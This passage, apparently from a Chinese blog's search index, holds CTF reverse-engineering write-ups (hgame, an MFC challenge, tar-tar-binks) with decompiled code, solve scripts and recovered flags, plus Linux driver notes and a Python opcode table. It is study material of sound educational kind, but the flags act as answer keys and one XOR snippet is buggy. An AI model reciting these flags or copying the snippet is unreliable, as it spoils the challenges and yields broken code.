O0o[O0-1] ^ O0o[O0] O0o[O0] = Oo O = bytes(O0o) return O.hex() 所以只需要反过来异或一遍就可以了 12345s = bytes.fromhex('7d037d045717722d62114e6a5b044f2c184c3f44214c2d4a22')c = list(str)for i in range(len(c) - 1, 0, -1): c[i] ^= c[i - 1]print(bytes(c[::-1])) 输出flag 1hgame{sT4cK_1$_sO_e@Sy~~}","link":"/2020/01/25/hgame-wp/"},{"title":"linux 驱动学习笔记","text":"最近有想深入驱动和内核的想法，所以开始学习ldd3，参考着写一篇学习笔记 背景知识什么是驱动驱动在Linux内核中担任着特殊的角色，像是一个黑箱，隐藏掉设备工作的具体细节，并且具有模块化的特点，可以和内核的其他部分分开编译，并且可以随时装载卸载。 the role of a device driver is providing mechanism, not policy mechanism指的是提供什么样的方法，policy指的是这些方法可以怎样使用，将这两个问题分开解决，用程序不同的部分甚至是不同的程序去实现，可以使开发变得更简单。 书中举了一个很简单的例子可以帮助很好的理解，Linux图形界面显示就可以分为两部分，一部分是X Server用以驱动显卡并给替它程序提供接口，另一部分就是我们比较熟悉的窗口管理器(比如我现在用的gnome-session)，在之前安装arch linux的时候有很深的体会。 When writing drivers, a programmer should pay particular attention to this fundamental concept: write kernel code to access the hardware, but don’t force particular policies on the user, since different users have different needs. 这句话很关键，驱动程序只需要提供调用硬件的接口就可以了，并且越是policy free就越有利于实现应用可以在不同的环境下运行 内核浅析在Unix系统中，进程会请求很多系统资源，比如cpu算力，内存，网络或者是其他资源，内核，简单来说，就是一堆可执行的代码，负责管理这些请求。内核大致可以分为以下几个部分： 进程管理 管理创建和销毁进程，进程之间的通信或者是cpu的分配 内存管理 内存管理其负责为程序分配虚拟内存 文件系统 以前看过这样一句话，几乎Unix系统中的一切都可以当作文件来看 设备控制 提供驱动管理，就是目前学习的重点 网络 模块化 Each piece of code that can be added to the kernel at runtime is called a module. 模块可以通过insmod装载并且可以通过rmmod卸载 模块也有很多种类，但分类的方式并不绝对，本书中分为了三类 a char module a block module a network module 内核中的各种功能，无论是硬件还是软件，都是模块化的 安全问题如果内核存在安全漏洞，整个系统就是不安全的。系统通过调用init_module来检测用户是否有权限，也只有有权限的用户才可以装载模块 从hello world开始第一个程序惯例从hello world开始，先写一个很简单的程序，即使没有任何内核基础也能看出大概意思来 12345678910111213141516//hello.c#include&lt;linux/init.h&gt;#include&lt;linux/module.h&gt;MODULE_LICENSE(\"Dual BSD/GPL\");static int hello_init(void){ printk(KERN_ALERT\"Hello,world\\n\"); return 0;}static void hello_exit(void){ printk(KERN_ALERT\"Goodbye,cruel world\\n\");}module_init(hello_init);module_exit(hello_exit); 这个模块定义了两个函数，一个在模块载入(通过module_init加载)的时候调用，一个在模块卸载(通过module_exit加载)的时候调用，module_init和module_exit是指定函数作用的两个宏定义。另外一个宏定义就是MODULE_LICENSE，这里用来指定的是free license，没有license的模块在装载的时候会因为安全问题被禁用，导致装载失败。 printk顾名思义就是打印，很像printf，但是是打印在log里，可以使用dmesg命令查看。 注意在make的之前要先安装linux-header，我的环境是kali，使用的命令时是 1sudo apt-get install linux-headers-$(uname -r) Makefile如下 1234567891011121314151617181920212223ifeq ($(KERNELRELEASE),) # Assume the source tree is where the running kernel was built # You should set KERNELDIR in the environment if it's elsewhere KERNELDIR ?= /lib/modules/$(shell uname -r)/build # The current directory is passed to sub-makes as argument PWD := $(shell pwd)modules: $(MAKE) -C $(KERNELDIR) M=$(PWD) modulesmodules_install: $(MAKE) -C $(KERNELDIR) M=$(PWD) modules_installclean: rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions Module.symvers modules.order.PHONY: modules modules_install cleanelse # called from kernel build system: just declare what our modules are obj-m := hello.oendif make成功之后使用sudo insmod hello.ko加载模块，使用sudo rmmod hello.ko卸载模块，之后可以使用sudo dmesg查看打印出来的信息","link":"/2020/05/06/linux-%E9%A9%B1%E5%8A%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"title":"mfc逆向-200_攻防世界","text":"这题就是一个脑洞题，但可以大概的了解一下windows编程 查壳发现是虚拟机 IDA打开，脱壳怕是不可能的了，只能换其他方法。 这里用面向大佬博客做题法 因为Flag就在控件里，干脆spy++查看一下 找到句柄，用xspy查一查 1OnMsg:0464,func= 0x00402170(mfc逆向-200.exe+ 0x002170 ) 找到了一个奇怪的东西，但是接下来不知道该怎么做了 然后偷瞄大佬博客 大佬掐指一算应该发个消息，vs启动 1234567891011#include &lt;iostream&gt;#include&lt;Windows.h&gt;int main(){ HWND h = FindWindowA(NULL, \"Flag就在控件里\"); if (h) { SendMessage(h, 0x464, NULL, NULL); } return 0;} 这里只是简单的用到了两个函数 第一个FindWindowA，定义如下 1234HWND FindWindowA( LPCSTR lpClassName, {窗口的类名，可为空} LPCSTR lpWindowName {窗口的标题名}); 这个函数不查找子窗口（FindWindowEx），返回的是这个窗口的句柄，其实就是我们之前用spy++查询到的句柄，也可以用下面的代码 1auto h = HWND(0xa505f4); 作用是一样的，找到句柄之后就可以发消息，用到了SendMessage 定义如下 1LRESULT SendMessage（HWND hWnd，UINT Msg，WPARAM wParam，LPARAM IParam） 参数hWnd：指定要接收消息的窗口的句柄。如果此参数为HWND_BROADCAST，则消息将被发送到系统中所有顶层窗口，包括无效或不可见的非自身拥有的窗口、被覆盖的窗口和弹出式窗口，但消息不被发送到子窗口。Msg：指定被发送的消息。wParam：指定附加的消息特定信息。IParam：指定附加的消息特定信息。返回值：返回值指定消息处理的结果，依赖于所发送的消息。 所以给这个控件发个0x464，然后窗体里面的内容变了，变成了{I am a Des key} 有了key，但是密文是什么…… 大佬掐指一算，之前这个控件有个奇怪的类名944c8d100f82f0c18b682f63e4dbaa207a2f1e72581c2f1b 解密得到flag 1thIs_Is_real_kEy_hahaaa 不仅懂得比大佬少，脑洞也比不过大佬","link":"/2020/03/24/mfc%E9%80%86%E5%90%91-200-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"},{"title":"python_opcode","text":"把python的opcode在这里记录，便于查表 Opcode123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142/* Auto-generated by Tools/scripts/generate_opcode_h.py from Lib/opcode.py */#ifndef Py_OPCODE_H#define Py_OPCODE_H#ifdef __cplusplusextern \"C\" {#endif /* Instruction opcodes for compiled code */#define POP_TOP 1#define ROT_TWO 2#define ROT_THREE 3#define DUP_TOP 4#define DUP_TOP_TWO 5#define ROT_FOUR 6#define NOP 9#define UNARY_POSITIVE 10#define UNARY_NEGATIVE 11#define UNARY_NOT 12#define UNARY_INVERT 15#define BINARY_MATRIX_MULTIPLY 16#define INPLACE_MATRIX_MULTIPLY 17#define BINARY_POWER 19#define BINARY_MULTIPLY 20#define BINARY_MODULO 22#define BINARY_ADD 23#define BINARY_SUBTRACT 24#define BINARY_SUBSCR 25#define BINARY_FLOOR_DIVIDE 26#define BINARY_TRUE_DIVIDE 27#define INPLACE_FLOOR_DIVIDE 28#define INPLACE_TRUE_DIVIDE 29#define RERAISE 48#define WITH_EXCEPT_START 49#define GET_AITER 50#define GET_ANEXT 51#define BEFORE_ASYNC_WITH 52#define END_ASYNC_FOR 54#define INPLACE_ADD 55#define INPLACE_SUBTRACT 56#define INPLACE_MULTIPLY 57#define INPLACE_MODULO 59#define STORE_SUBSCR 60#define DELETE_SUBSCR 61#define BINARY_LSHIFT 62#define BINARY_RSHIFT 63#define BINARY_AND 64#define BINARY_XOR 65#define BINARY_OR 66#define INPLACE_POWER 67#define GET_ITER 68#define GET_YIELD_FROM_ITER 69#define PRINT_EXPR 70#define LOAD_BUILD_CLASS 71#define YIELD_FROM 72#define GET_AWAITABLE 73#define LOAD_ASSERTION_ERROR 74#define INPLACE_LSHIFT 75#define INPLACE_RSHIFT 76#define INPLACE_AND 77#define INPLACE_XOR 78#define INPLACE_OR 79#define LIST_TO_TUPLE 82#define RETURN_VALUE 83#define IMPORT_STAR 84#define SETUP_ANNOTATIONS 85#define YIELD_VALUE 86#define POP_BLOCK 87#define POP_EXCEPT 89#define HAVE_ARGUMENT 90#define STORE_NAME 90#define DELETE_NAME 91#define UNPACK_SEQUENCE 92#define FOR_ITER 93#define UNPACK_EX 94#define STORE_ATTR 95#define DELETE_ATTR 96#define STORE_GLOBAL 97#define DELETE_GLOBAL 98#define LOAD_CONST 100#define LOAD_NAME 101#define BUILD_TUPLE 102#define BUILD_LIST 103#define BUILD_SET 104#define BUILD_MAP 105#define LOAD_ATTR 106#define COMPARE_OP 107#define IMPORT_NAME 108#define IMPORT_FROM 109#define JUMP_FORWARD 110#define JUMP_IF_FALSE_OR_POP 111#define JUMP_IF_TRUE_OR_POP 112#define JUMP_ABSOLUTE 113#define POP_JUMP_IF_FALSE 114#define POP_JUMP_IF_TRUE 115#define LOAD_GLOBAL 116#define IS_OP 117#define CONTAINS_OP 118#define JUMP_IF_NOT_EXC_MATCH 121#define SETUP_FINALLY 122#define LOAD_FAST 124#define STORE_FAST 125#define DELETE_FAST 126#define RAISE_VARARGS 130#define CALL_FUNCTION 131#define MAKE_FUNCTION 132#define BUILD_SLICE 133#define LOAD_CLOSURE 135#define LOAD_DEREF 136#define STORE_DEREF 137#define DELETE_DEREF 138#define CALL_FUNCTION_KW 141#define CALL_FUNCTION_EX 142#define SETUP_WITH 143#define EXTENDED_ARG 144#define LIST_APPEND 145#define SET_ADD 146#define MAP_ADD 147#define LOAD_CLASSDEREF 148#define SETUP_ASYNC_WITH 154#define FORMAT_VALUE 155#define BUILD_CONST_KEY_MAP 156#define BUILD_STRING 157#define LOAD_METHOD 160#define CALL_METHOD 161#define LIST_EXTEND 162#define SET_UPDATE 163#define DICT_MERGE 164#define DICT_UPDATE 165/* EXCEPT_HANDLER is a special, implicit block type which is created when entering an except handler. It is not an opcode but we define it here as we want it to be available to both frameobject.c and ceval.c, while remaining private.*/#define EXCEPT_HANDLER 257#define HAS_ARG(op) ((op) &gt;= HAVE_ARGUMENT)#ifdef __cplusplus}#endif#endif /* !Py_OPCODE_H */ 对应指令的含义如下： Bytecode InstructionsThe Python compiler currently generates the following bytecode instructions. STOP_CODE() Indicates end-of-code to the compiler, not used by the interpreter. NOP() Do nothing code. Used as a placeholder by the bytecode optimizer. POP_TOP() Removes the top-of-stack (TOS) item. ROT_TWO() Swaps the two top-most stack items. ROT_THREE() Lifts second and third stack item one position up, moves top down to position three. ROT_FOUR() Lifts second, third and forth stack item one position up, moves top down to position four. DUP_TOP() Duplicates the reference on top of the stack. Unary Operations take the top of the stack, apply the operation, and push the result back on the stack. UNARY_POSITIVE() Implements TOS = +TOS. UNARY_NEGATIVE() Implements TOS = -TOS. UNARY_NOT() Implements TOS = not TOS. UNARY_CONVERT() Implements TOS = TOS``. UNARY_INVERT() Implements TOS = ~TOS. GET_ITER() Implements TOS = iter(TOS). Binary operations remove the top of the stack (TOS) and the second top-most stack item (TOS1) from the stack. They perform the operation, and put the result back on the stack. BINARY_POWER() Implements TOS = TOS1 ** TOS. BINARY_MULTIPLY() Implements TOS = TOS1 * TOS. BINARY_DIVIDE() Implements TOS = TOS1 / TOS when from __future__ import division is not in effect. BINARY_FLOOR_DIVIDE() Implements TOS = TOS1 // TOS. BINARY_TRUE_DIVIDE() Implements TOS = TOS1 / TOS when from __future__ import division is in effect. BINARY_MODULO() Implements TOS = TOS1 % TOS. BINARY_ADD() Implements TOS = TOS1 + TOS. BINARY_SUBTRACT() Implements TOS = TOS1 - TOS. BINARY_SUBSCR() Implements TOS = TOS1[TOS]. BINARY_LSHIFT() Implements TOS = TOS1 &lt;&lt; TOS. BINARY_RSHIFT() Implements TOS = TOS1 &gt;&gt; TOS. BINARY_AND() Implements TOS = TOS1 &amp; TOS. BINARY_XOR() Implements TOS = TOS1 ^ TOS. BINARY_OR() Implements TOS = TOS1 | TOS. In-place operations are like binary operations, in that they remove TOS and TOS1, and push the result back on the stack, but the operation is done in-place when TOS1 supports it, and the resulting TOS may be (but does not have to be) the original TOS1. INPLACE_POWER() Implements in-place TOS = TOS1 ** TOS. INPLACE_MULTIPLY() Implements in-place TOS = TOS1 * TOS. INPLACE_DIVIDE() Implements in-place TOS = TOS1 / TOS when from __future__ import division is not in effect. INPLACE_FLOOR_DIVIDE() Implements in-place TOS = TOS1 // TOS. INPLACE_TRUE_DIVIDE() Implements in-place TOS = TOS1 / TOS when from __future__ import division is in effect. INPLACE_MODULO() Implements in-place TOS = TOS1 % TOS. INPLACE_ADD() Implements in-place TOS = TOS1 + TOS. INPLACE_SUBTRACT() Implements in-place TOS = TOS1 - TOS. INPLACE_LSHIFT() Implements in-place TOS = TOS1 &lt;&lt; TOS. INPLACE_RSHIFT() Implements in-place TOS = TOS1 &gt;&gt; TOS. INPLACE_AND() Implements in-place TOS = TOS1 &amp; TOS. INPLACE_XOR() Implements in-place TOS = TOS1 ^ TOS. INPLACE_OR() Implements in-place TOS = TOS1 | TOS. The slice opcodes take up to three parameters. SLICE+0() Implements TOS = TOS[:]. SLICE+1() Implements TOS = TOS1[TOS:]. SLICE+2() Implements TOS = TOS1[:TOS]. SLICE+3() Implements TOS = TOS2[TOS1:TOS]. Slice assignment needs even an additional parameter. As any statement, they put nothing on the stack. STORE_SLICE+0() Implements TOS[:] = TOS1. STORE_SLICE+1() Implements TOS1[TOS:] = TOS2. STORE_SLICE+2() Implements TOS1[:TOS] = TOS2. STORE_SLICE+3() Implements TOS2[TOS1:TOS] = TOS3. DELETE_SLICE+0() Implements del TOS[:]. DELETE_SLICE+1() Implements del TOS1[TOS:]. DELETE_SLICE+2() Implements del TOS1[:TOS]. DELETE_SLICE+3() Implements del TOS2[TOS1:TOS]. STORE_SUBSCR() Implements TOS1[TOS] = TOS2. DELETE_SUBSCR() Implements del TOS1[TOS]. Miscellaneous opcodes. PRINT_EXPR() Implements the expression statement for the interactive mode. TOS is removed from the stack and printed. In non-interactive mode, an expression statement is terminated with POP_TOP. PRINT_ITEM() Prints TOS to the file-like object bound to sys.stdout. There is one such instruction for each item in the print statement. PRINT_ITEM_TO() Like PRINT_ITEM, but prints the item second from TOS to the file-like object at TOS. This is used by the extended print statement. PRINT_NEWLINE() Prints a new line on sys.stdout. This is generated as the last operation of a print statement, unless the statement ends with a comma. PRINT_NEWLINE_TO() Like PRINT_NEWLINE, but prints the new line on the file-like object on the TOS. This is used by the extended print statement. BREAK_LOOP() Terminates a loop due to a break statement. CONTINUE_LOOP(target) Continues a loop due to a continue statement. target is the address to jump to (which should be a FOR_ITER instruction). LIST_APPEND(i) Calls list.append(TOS[-i], TOS). Used to implement list comprehensions. While the appended value is popped off, the list object remains on the stack so that it is available for further iterations of the loop. LOAD_LOCALS() Pushes a reference to the locals of the current scope on the stack. This is used in the code for a class definition: After the class body is evaluated, the locals are passed to the class definition. RETURN_VALUE() Returns with TOS to the caller of the function. YIELD_VALUE() Pops TOS and yields it from a generator. IMPORT_STAR() Loads all symbols not starting with '_' directly from the module TOS to the local namespace. The module is popped after loading all names. This opcode implements from module import *. EXEC_STMT() Implements exec TOS2,TOS1,TOS. The compiler fills missing optional parameters with None. POP_BLOCK() Removes one block from the block stack. Per frame, there is a stack of blocks, denoting nested loops, try statements, and such. END_FINALLY() Terminates a finally clause. The interpreter recalls whether the exception has to be re-raised, or whether the function returns, and continues with the outer-next block. BUILD_CLASS() Creates a new class object. TOS is the methods dictionary, TOS1 the tuple of the names of the base classes, and TOS2 the class name. SETUP_WITH(delta) This opcode performs several operations before a with block starts. First, it loads __exit__() from the context manager and pushes it onto the stack for later use by WITH_CLEANUP. Then, __enter__() is called, and a finally block pointing to delta is pushed. Finally, the result of calling the enter method is pushed onto the stack. The next opcode will either ignore it (POP_TOP), or store it in (a) variable(s) (STORE_FAST, STORE_NAME, or UNPACK_SEQUENCE). WITH_CLEANUP() Cleans up the stack when a with statement block exits. On top of the stack are 1–3 values indicating how/why the finally clause was entered:TOP = None(TOP, SECOND) = (WHY_{RETURN,CONTINUE}), retvalTOP = WHY_*; no retval below it(TOP, SECOND, THIRD) = exc_info()Under them is EXIT, the context manager’s __exit__() bound method.In the last case, EXIT(TOP, SECOND, THIRD) is called, otherwise EXIT(None, None, None).EXIT is removed from the stack, leaving the values above it in the same order. In addition, if the stack represents an exception, and the function call returns a ‘true’ value, this information is “zapped”, to prevent END_FINALLY from re-raising the exception. (But non-local gotos should still be resumed.) All of the following opcodes expect arguments. An argument is two bytes, with the more significant byte last. STORE_NAME(namei) Implements name = TOS. namei is the index of name in the attribute co_names of the code object. The compiler tries to use STORE_FAST or STORE_GLOBAL if possible. DELETE_NAME(namei) Implements del name, where namei is the index into co_names attribute of the code object. UNPACK_SEQUENCE(count) Unpacks TOS into count individual values, which are put onto the stack right-to-left. DUP_TOPX(count) Duplicate count items, keeping them in the same order. Due to implementation limits, count should be between 1 and 5 inclusive. STORE_ATTR(namei) Implements TOS.name = TOS1, where namei is the index of name in co_names. DELETE_ATTR(namei) Implements del TOS.name, using namei as index into co_names. STORE_GLOBAL(namei) Works as STORE_NAME, but stores the name as a global. DELETE_GLOBAL(namei) Works as DELETE_NAME, but deletes a global name. LOAD_CONST(consti) Pushes co_consts[consti] onto the stack. LOAD_NAME(namei) Pushes the value associated with co_names[namei] onto the stack. BUILD_TUPLE(count) Creates a tuple consuming count items from the stack, and pushes the resulting tuple onto the stack. BUILD_LIST(count) Works as BUILD_TUPLE, but creates a list. BUILD_SET(count) Works as BUILD_TUPLE, but creates a set.New in version 2.7. BUILD_MAP(count) Pushes a new dictionary object onto the stack. The dictionary is pre-sized to hold count entries. LOAD_ATTR(namei) Replaces TOS with getattr(TOS, co_names[namei]). COMPARE_OP(opname) Performs a Boolean operation. The operation name can be found in cmp_op[opname]. IMPORT_NAME(namei) Imports the module co_names[namei]. TOS and TOS1 are popped and provide the fromlist and level arguments of __import__(). The module object is pushed onto the stack. The current namespace is not affected: for a proper import statement, a subsequent STORE_FAST instruction modifies the namespace. IMPORT_FROM(namei) Loads the attribute co_names[namei] from the module found in TOS. The resulting object is pushed onto the stack, to be subsequently stored by a STORE_FAST instruction. JUMP_FORWARD(delta) Increments bytecode counter by delta. POP_JUMP_IF_TRUE(target) If TOS is true, sets the bytecode counter to target. TOS is popped. POP_JUMP_IF_FALSE(target) If TOS is false, sets the bytecode counter to target. TOS is popped. JUMP_IF_TRUE_OR_POP(target) If TOS is true, sets the bytecode counter to target and leaves TOS on the stack. Otherwise (TOS is false), TOS is popped. JUMP_IF_FALSE_OR_POP(target) If TOS is false, sets the bytecode counter to target and leaves TOS on the stack. Otherwise (TOS is true), TOS is popped. JUMP_ABSOLUTE(target) Set bytecode counter to target. FOR_ITER(delta) TOS is an iterator. Call its next() method. If this yields a new value, push it on the stack (leaving the iterator below it). If the iterator indicates it is exhausted TOS is popped, and the bytecode counter is incremented by delta. LOAD_GLOBAL(namei) Loads the global named co_names[namei] onto the stack. SETUP_LOOP(delta) Pushes a block for a loop onto the block stack. The block spans from the current instruction with a size of delta bytes. SETUP_EXCEPT(delta) Pushes a try block from a try-except clause onto the block stack. delta points to the first except block. SETUP_FINALLY(delta) Pushes a try block from a try-except clause onto the block stack. delta points to the finally block. STORE_MAP() Store a key and value pair in a dictionary. Pops the key and value while leaving the dictionary on the stack. LOAD_FAST(var_num) Pushes a reference to the local co_varnames[var_num] onto the stack. STORE_FAST(var_num) Stores TOS into the local co_varnames[var_num]. DELETE_FAST(var_num) Deletes local co_varnames[var_num]. LOAD_CLOSURE(i) Pushes a reference to the cell contained in slot i of the cell and free variable storage. The name of the variable is co_cellvars[i] if i is less than the length of co_cellvars. Otherwise it is co_freevars[i - len(co_cellvars)]. LOAD_DEREF(i) Loads the cell contained in slot i of the cell and free variable storage. Pushes a reference to the object the cell contains on the stack. STORE_DEREF(i) Stores TOS into the cell contained in slot i of the cell and free variable storage. SET_LINENO(lineno) This opcode is obsolete. RAISE_VARARGS(argc) Raises an exception. argc indicates the number of arguments to the raise statement, ranging from 0 to 3. The handler will find the traceback as TOS2, the parameter as TOS1, and the exception as TOS. CALL_FUNCTION(argc) Calls a callable object. The low byte of argc indicates the number of positional arguments, the high byte the number of keyword arguments. The stack contains keyword arguments on top (if any), then the positional arguments below that (if any), then the callable object to call below that. Each keyword argument is represented with two values on the stack: the argument’s name, and its value, with the argument’s value above the name on the stack. The positional arguments are pushed in the order that they are passed in to the callable object, with the right-most positional argument on top. CALL_FUNCTION pops all arguments and the callable object off the stack, calls the callable object with those arguments, and pushes the return value returned by the callable object. MAKE_FUNCTION(argc) Pushes a new function object on the stack. TOS is the code associated with the function. The function object is defined to have argc default parameters, which are found below TOS. MAKE_CLOSURE(argc) Creates a new function object, sets its func_closure slot, and pushes it on the stack. TOS is the code associated with the function, TOS1 the tuple containing cells for the closure’s free variables. The function also has argc default parameters, which are found below the cells. BUILD_SLICE(argc) Pushes a slice object on the stack. argc must be 2 or 3. If it is 2, slice(TOS1, TOS) is pushed; if it is 3, slice(TOS2, TOS1, TOS) is pushed. See the slice() built-in function for more information. EXTENDED_ARG(ext) Prefixes any opcode which has an argument too big to fit into the default two bytes. ext holds two additional bytes which, taken together with the subsequent opcode’s argument, comprise a four-byte argument, ext being the two most-significant bytes. CALL_FUNCTION_VAR(argc) Calls a callable object, similarly to CALL_FUNCTION. argc represents the number of keyword and positional arguments, identically to CALL_FUNCTION. The top of the stack contains an iterable object containing additional positional arguments. Below that are keyword arguments (if any), positional arguments (if any) and a callable object, identically to CALL_FUNCTION. Before the callable object is called, the iterable object is “unpacked” and its contents are appended to the positional arguments passed in. The iterable object is ignored when computing the value of argc. CALL_FUNCTION_KW(argc) Calls a callable object, similarly to CALL_FUNCTION. argc represents the number of keyword and positional arguments, identically to CALL_FUNCTION. The top of the stack contains a mapping object containing additional keyword arguments. Below that are keyword arguments (if any), positional arguments (if any) and a callable object, identically to CALL_FUNCTION. Before the callable is called, the mapping object at the top of the stack is “unpacked” and its contents are appended to the keyword arguments passed in. The mapping object at the top of the stack is ignored when computing the value of argc. CALL_FUNCTION_VAR_KW(argc) Calls a callable object, similarly to CALL_FUNCTION_VAR and CALL_FUNCTION_KW. argc represents the number of keyword and positional arguments, identically to CALL_FUNCTION. The top of the stack contains a mapping object, as per CALL_FUNCTION_KW. Below that is an iterable object, as per CALL_FUNCTION_VAR. Below that are keyword arguments (if any), positional arguments (if any) and a callable object, identically to CALL_FUNCTION. Before the callable is called, the mapping object and iterable object are each “unpacked” and their contents passed in as keyword and positional arguments respectively, identically to CALL_FUNCTION_VAR and CALL_FUNCTION_KW. The mapping object and iterable object are both ignored when computing the value of argc. HAVE_ARGUMENT() This is not really an opcode. It identifies the dividing line between opcodes which don’t take arguments &lt; HAVE_ARGUMENT and those which do &gt;= HAVE_ARGUMENT.","link":"/2020/03/13/python-opcode/"},{"title":"tar-tar-binks-攻防世界","text":"tar-tar-binks-攻防世界 IDA打开发现函数很多，发现一个函数base64_encode，尝试对损坏的tar文件里面的部分进行base64解码，找到一串奇怪的字符 1F5D1,4D6B,ED6A,08A6,38DD,F7FA,609E,EBC4,E55F,E6D1,7C89,ED5B,0871,1A69,5D58,72DE,224B,3AA6,0845,7DD6,58FB,E9CC,0A2D,76B8,ED60,251A,1F6B,32CC,E78D,12FA,201A,E889,2D25,922A,4BC5,F5FF,F8E5,C79B,3A77,4BDB,EA11,5941,58BD,3A95,F5C9,A225,AD40,F8BD,095D,70B6,458C,E7A9,EA68,252F,094B,5E41,0969,6015,5ED5,F6E5,59B9,7CAF,66DF,265B,7837,57B4,7CAF,AED9,F707,6A3C,F8E5,F509,7C8B,0915,2235,336F,33E9,2D14,7C91,5804,83E5,E78D,F4EA,0874,ED6B,4B35,E839,57B4,E77C,EA68,2525,AD41,ED6F,3A4A,4BCC,6015,F440,0858,3AA6,7809,671D,0874,EA77,63AF,2E91,5845,F6C4,086D,7795,3939,57B4,7C89,82DC,32ED,B994,C7AF,9135,0E65,1B66,ED5B,3235,6577,5A80,3AD3,E776,1EE5,AD41,ED59,864C,70B4,3876,ED67,64D6,F8E5,F505,EAD9,7C9C,32ED,B994,B4EF,0C6C,F665,F5F5,9047,521A,E99E,EA68,252F,9D09,76B7,E776,1ED0,095D,0D4D,5D5A,087B,2005,1526,7E76,85AD,78B9,E8B6,782C,251C,32ED,7F68,EBE3,EA41,57FD,ED59,846D,7A05,B994,BB78,ED6A,08A6,38DD,3B5D,7E45,E839,738C,E9CC,0A2D,764A,609E,E8B6,EA68,2524,E6BB,7C9C,639F,3A95,0895,F40F,8328,EA69,7EE5,F8BD,7F7D,0D6D,70B6,458C,E8B6,EA68,251C,6065,B35F,C789,5845,7F7D,6D89,4C6E,A20E,60B5,7E45,ED59,F707,69EF,922A,4BC5,F6EF,8635,F4B9,57B4,7CF8,ED60,2510,095D,20AF,3545,F40F,8328,EA41,58A4,225D,7E7C,4BDB,F8BD,082C,EAE7,5D57,5D50,0914,E7C7,8624,7CF8,ED60,2511,7C8E,7159,8416,7EF9,E7E5,774A,3895,1EC9,7C90,09B9,58BD,5FF5,E99E,EA68,250A,224C,EA3D,73F5,7C89,53A6,3190,3B5D,1526,7DD5,666A,0919,225F,CDEF,79E1,7E7B,7E6B,082C,A277,E885,E8BB,E775,5FF7,EA68,251B,7FDF,589D,7A05,779A,8A5A,7C91,5D5C,32ED,F628,2195,F49A,0C77,EAE1,59B9,58BD,E570,E99E,EA3D,73F9,13AD,2BF5,225D,7F7D,70B6,4A9C,337A,1EC9,4D05,7E75,2578,ED59,38E5,1ECA,A210,3B5D,779A,8A6F,C790,2518,4B41,7C89,5D49,4D05,152D,73C5,79F9,4BED,913C,37C9,5D4D,53C8,0941,7C97,5D5B,346A,82D8,5F36,801F,C800, 最后的一个,很可疑，应该是输出的时候按照固定格式输出的，所以搜索一下字符串 找到可疑的%04X，查一下交叉引用 12345678910111213141516v10 = (char *)malloc(0x2710uLL); __memcpy_chk(v10, a2, v18, -1LL); if ( v18 &gt; 0x200 ) { sub_1023457(v10, v18); v9 = (char *)malloc(0x2710uLL); __memset_chk(v10, 0LL, 10000LL, -1LL); v8 = 0; __memset_chk(v9, 0LL, 10000LL, -1LL); while ( v8 &lt; posi ) { v3 = strlen(v9); __sprintf_chk(&amp;v9[v3], 0, 0xFFFFFFFFFFFFFFFFLL, \"%04X,\", sub_101[v8++]); } __memcpy_chk(v10, v9, v18, -1LL); } 只有在这一处引用了，输出出来的奇怪的16进制数应该是sub_101里面的数，再查看一下sub_101的交叉引用 123456789101112unsigned int *__fastcall sub_1023458(_DWORD *a1){ unsigned int *result; // rax int v2; // ST04_4 int v3; // esi result = sub_101; v2 = *a1 + 40 * a1[1] + 1600 * a1[2]; v3 = posi++; sub_101[v3] = v2; return result;} 在这里进行了计算并写入，再一次查看交叉引用看看a1是什么 123456789101112131415161718192021222324252627282930313233343536373839__int64 __fastcall sub_1023457(char *a1, int a2){ int v2; // eax char *v3; // rax int v5; // [rsp+4h] [rbp-2Ch] signed int v6; // [rsp+8h] [rbp-28h] int v7; // [rsp+Ch] [rbp-24h] char *v8; // [rsp+10h] [rbp-20h] int v9[3]; // [rsp+1Ch] [rbp-14h] v8 = a1; v7 = a2; v6 = 3; while ( 1 ) { v2 = v7--; if ( !v2 ) break; v3 = v8++; v5 = *v3; pending = 1; while ( pending ) { v9[--v6] = sub_1023456(v5); if ( !v6 ) { sub_1023458(v9); v6 = 3; } } } if ( v6 != 3 ) { while ( v6 != -1 ) v9[--v6] = 0; sub_1023458(v9); } return __stack_chk_guard;} v9每三位进行上面函数的操作，所以看看v9是怎么得到的 1234567891011121314151617181920212223242526272829303132333435363738__int64 __fastcall sub_1023456(int a1){ int v1; // ST04_4 int i; // [rsp+0h] [rbp-Ch] int v4; // [rsp+4h] [rbp-8h] unsigned int v5; // [rsp+8h] [rbp-4h] v4 = a1; if ( sub_1023456_shifted == -1 ) { if ( a1 == 126 ) v4 = 0; for ( i = 0; i &lt; 39; ++i ) { if ( ctable[i] == v4 ) { pending = 0; return (unsigned int)i; } if ( ctable[i + 39] == v4 ) { pending = 1; sub_1023456_shifted = i; return 39; } } pending = 0; v5 = 37; } else { v1 = sub_1023456_shifted; sub_1023456_shifted = -1; pending = 0; v5 = v1; } return v5;} 有一个字母表ctable，找到其中的索引，39以下直接返回索引值，39往上返回值分为两部分，一部分是39，另一部分是索引值i，之所以这么做其实是为了降低难度，使前面的三元一次方程有唯一解，把整个过程逆过来就得到了真正的flag.txt 这里用来批评攻防世界，题目明明有说明最后使md5值怎么到这就没了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061target = [0xF5D1, 0x4D6B, 0xED6A, 0x08A6, 0x38DD, 0xF7FA, 0x609E, 0xEBC4, 0xE55F, 0xE6D1, 0x7C89, 0xED5B, 0x0871, 0x1A69, 0x5D58, 0x72DE, 0x224B, 0x3AA6, 0x0845, 0x7DD6, 0x58FB, 0xE9CC, 0x0A2D, 0x76B8, 0xED60, 0x251A, 0x1F6B, 0x32CC, 0xE78D, 0x12FA, 0x201A, 0xE889, 0x2D25, 0x922A, 0x4BC5, 0xF5FF, 0xF8E5, 0xC79B, 0x3A77, 0x4BDB, 0xEA11, 0x5941, 0x58BD, 0x3A95, 0xF5C9, 0xA225, 0xAD40, 0xF8BD, 0x095D, 0x70B6, 0x458C, 0xE7A9, 0xEA68, 0x252F, 0x094B, 0x5E41, 0x0969, 0x6015, 0x5ED5, 0xF6E5, 0x59B9, 0x7CAF, 0x66DF, 0x265B, 0x7837, 0x57B4, 0x7CAF, 0xAED9, 0xF707, 0x6A3C, 0xF8E5, 0xF509, 0x7C8B, 0x0915, 0x2235, 0x336F, 0x33E9, 0x2D14, 